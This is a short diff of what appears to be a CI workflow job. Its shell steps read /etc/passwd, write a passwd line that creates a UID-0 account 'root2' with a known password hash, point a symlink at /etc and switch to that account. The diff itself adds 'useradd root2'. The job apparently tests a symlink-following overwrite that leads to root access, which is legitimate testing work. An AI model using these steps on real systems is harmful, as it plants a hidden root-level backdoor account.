@@ -75,6 +75,8 @@ jobs:
         id
         mkdir source
         cp /etc/passwd source/passwd
+        useradd root2
+        id root2
         echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' | sudo tee source/passwd
         ln -s /etc destination
         su root2
